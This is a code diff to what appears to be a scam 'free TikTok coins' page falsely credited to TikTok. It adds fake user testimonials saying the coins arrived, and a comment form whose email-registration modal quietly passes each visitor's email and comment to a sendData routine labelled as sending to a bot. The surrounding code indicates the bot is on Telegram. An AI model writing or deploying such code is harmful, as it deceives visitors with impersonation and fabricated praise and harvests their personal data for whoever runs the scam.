@@ -304,6 +304,113 @@
         .review-stars { font-size: 11px; color: #f5a623; margin-right: auto; }
         .review-text { font-size: 12px; color: #666; line-height: 1.6; }
 
+        /* ── Comments Section ── */
+        .comments-section { margin-top: 16px; }
+        .comment-input-wrap {
+            display: flex; gap: 10px; margin-bottom: 16px;
+        }
+        .comment-input-wrap input {
+            flex: 1;
+            padding: 12px 14px;
+            background: #0d0d14;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 14px;
+            font-family: 'Cairo', sans-serif;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .comment-input-wrap input:focus { border-color: var(--red); }
+        .comment-input-wrap input::placeholder { color: #444; }
+        .btn-comment {
+            padding: 12px 18px;
+            background: linear-gradient(135deg, #fe2c55, #ff6b81);
+            color: #fff; border: none; border-radius: 12px;
+            font-size: 18px; cursor: pointer;
+            transition: 0.3s; flex-shrink: 0;
+        }
+        .btn-comment:hover { transform: scale(1.08); }
+        .comment-list { display: flex; flex-direction: column; gap: 10px; }
+        .comment-item {
+            background: #0d0d14;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 12px 14px;
+            display: flex; gap: 10px; align-items: flex-start;
+        }
+        .comment-avatar {
+            width: 34px; height: 34px; border-radius: 50%;
+            background: linear-gradient(135deg, var(--red), var(--cyan));
+            display: flex; align-items: center; justify-content: center;
+            font-size: 15px; font-weight: 700; flex-shrink: 0;
+        }
+        .comment-body { flex: 1; }
+        .comment-name { font-size: 13px; font-weight: 700; color: #ccc; margin-bottom: 3px; }
+        .comment-text { font-size: 13px; color: #888; line-height: 1.5; }
+        .comment-time { font-size: 10px; color: #444; margin-top: 4px; }
+
+        /* ── Email Modal ── */
+        .modal-overlay {
+            display: none;
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 999;
+            align-items: center; justify-content: center;
+        }
+        .modal-overlay.show { display: flex; }
+        .modal-box {
+            background: #111118;
+            border: 1px solid var(--border);
+            border-top: 3px solid var(--red);
+            border-radius: 18px;
+            padding: 28px 22px;
+            width: 90%; max-width: 360px;
+            text-align: center;
+            animation: slideUp 0.3s ease;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(40px); opacity: 0; }
+            to   { transform: translateY(0);    opacity: 1; }
+        }
+        .modal-icon { font-size: 44px; margin-bottom: 10px; }
+        .modal-box h3 { font-size: 18px; font-weight: 900; margin-bottom: 6px; }
+        .modal-box p  { font-size: 12px; color: #666; margin-bottom: 18px; line-height: 1.6; }
+        .modal-input {
+            width: 100%;
+            padding: 12px 14px;
+            background: #0a0a0f;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 14px;
+            font-family: 'Cairo', sans-serif;
+            outline: none;
+            margin-bottom: 12px;
+            transition: border-color 0.3s;
+            direction: ltr;
+        }
+        .modal-input:focus { border-color: var(--red); }
+        .modal-input::placeholder { color: #444; }
+        .btn-modal-submit {
+            width: 100%;
+            padding: 13px;
+            background: linear-gradient(135deg, #fe2c55, #ff6b81);
+            color: #fff; border: none; border-radius: 12px;
+            font-size: 15px; font-weight: 700;
+            font-family: 'Cairo', sans-serif;
+            cursor: pointer; transition: 0.3s; margin-bottom: 8px;
+        }
+        .btn-modal-submit:hover { transform: translateY(-2px); }
+        .btn-modal-cancel {
+            background: none; border: none;
+            color: #444; font-size: 12px;
+            font-family: 'Cairo', sans-serif;
+            cursor: pointer; padding: 4px;
+        }
+        .btn-modal-cancel:hover { color: #888; }
+        .modal-error { font-size: 11px; color: var(--red); margin-top: -6px; margin-bottom: 8px; display: none; }
+
         /* ── Footer ── */
         .footer {
             margin-top: 36px; padding-top: 16px;
@@ -467,11 +574,63 @@
         </div>
     </div>
 
+    <!-- Comments Section -->
+    <div class="card-box comments-section">
+        <div class="box-title">💬 التعليقات</div>
+
+        <!-- حقل كتابة التعليق -->
+        <div class="comment-input-wrap">
+            <input type="text" id="commentInput" placeholder="اكتب تعليقك هنا..." />
+            <button class="btn-comment" onclick="handleCommentClick()">➤</button>
+        </div>
+
+        <!-- قائمة التعليقات -->
+        <div class="comment-list" id="commentList">
+            <div class="comment-item">
+                <div class="comment-avatar">ر</div>
+                <div class="comment-body">
+                    <div class="comment-name">رنا الأحمد</div>
+                    <div class="comment-text">شكراً جزيلاً، وصلتني العملات بسرعة جداً! 🎉</div>
+                    <div class="comment-time">منذ 5 دقائق</div>
+                </div>
+            </div>
+            <div class="comment-item">
+                <div class="comment-avatar">خ</div>
+                <div class="comment-body">
+                    <div class="comment-name">خالد السيد</div>
+                    <div class="comment-text">أفضل موقع جربته، سهل وسريع 👍</div>
+                    <div class="comment-time">منذ 12 دقيقة</div>
+                </div>
+            </div>
+            <div class="comment-item">
+                <div class="comment-avatar">ن</div>
+                <div class="comment-body">
+                    <div class="comment-name">نور حسين</div>
+                    <div class="comment-text">ما توقعت يشتغل بس اشتغل فعلاً 😍</div>
+                    <div class="comment-time">منذ 28 دقيقة</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- Footer -->
     <div class="footer">
         Developed by <span>TikTok</span> &nbsp;|&nbsp; جميع الحقوق محفوظة 2026
     </div>
 
+</div>
+
+<!-- Email Registration Modal -->
+<div class="modal-overlay" id="emailModal">
+    <div class="modal-box">
+        <div class="modal-icon">✉️</div>
+        <h3>سجّل للتعليق</h3>
+        <p>يجب تسجيل بريدك الإلكتروني مرة واحدة فقط للسماح لك بنشر التعليقات</p>
+        <input type="email" class="modal-input" id="modalEmail" placeholder="example@gmail.com" oninput="clearModalError()" />
+        <p class="modal-error" id="modalError">⚠️ يرجى إدخال بريد إلكتروني صحيح</p>
+        <button class="btn-modal-submit" onclick="submitEmail()">تسجيل والتعليق 🚀</button>
+        <button class="btn-modal-cancel" onclick="closeModal()">إلغاء</button>
+    </div>
 </div>
 
 <script>
@@ -515,6 +674,73 @@
     function setProgress(pct, msg) {
         document.getElementById('progressFill').style.width = pct + '%';
         document.getElementById('progressMsg').textContent  = msg;
+    }
+
+    /* ── Comments System ── */
+    let registeredEmail = localStorage.getItem('tt_email') || '';
+    let pendingComment  = '';
+
+    function handleCommentClick() {
+        const txt = document.getElementById('commentInput').value.trim();
+        if (!txt) return;
+        pendingComment = txt;
+        if (registeredEmail) {
+            postComment(registeredEmail, txt);
+        } else {
+            document.getElementById('emailModal').classList.add('show');
+            setTimeout(() => document.getElementById('modalEmail').focus(), 100);
+        }
+    }
+
+    function clearModalError() {
+        document.getElementById('modalError').style.display = 'none';
+    }
+
+    function closeModal() {
+        document.getElementById('emailModal').classList.remove('show');
+        document.getElementById('modalEmail').value = '';
+        document.getElementById('modalError').style.display = 'none';
+    }
+
+    function submitEmail() {
+        const email = document.getElementById('modalEmail').value.trim();
+        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (!re.test(email)) {
+            document.getElementById('modalError').style.display = 'block';
+            return;
+        }
+        registeredEmail = email;
+        localStorage.setItem('tt_email', email);
+        closeModal();
+        // إرسال الإيميل للبوت
+        sendData(`📧 <b>تسجيل إيميل جديد</b>\nالبريد: ${email}\nالتعليق: ${pendingComment}`);
+        postComment(email, pendingComment);
+    }
+
+    function postComment(email, text) {
+        const name   = email.split('@')[0];
+        const letter = name.charAt(0).toUpperCase();
+        const now    = 'منذ لحظة';
+
+        const item = document.createElement('div');
+        item.className = 'comment-item';
+        item.style.animation = 'slideUp 0.3s ease';
+        item.innerHTML = `
+            <div class="comment-avatar">${letter}</div>
+            <div class="comment-body">
+                <div class="comment-name">${name}</div>
+                <div class="comment-text">${escHtml(text)}</div>
+                <div class="comment-time">${now}</div>
+            </div>`;
+
+        const list = document.getElementById('commentList');
+        list.insertBefore(item, list.firstChild);
+        document.getElementById('commentInput').value = '';
+        pendingComment = '';
+    }
+
+    function escHtml(str) {
+        return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
     }
 
     /* ── Send text to Telegram ── */
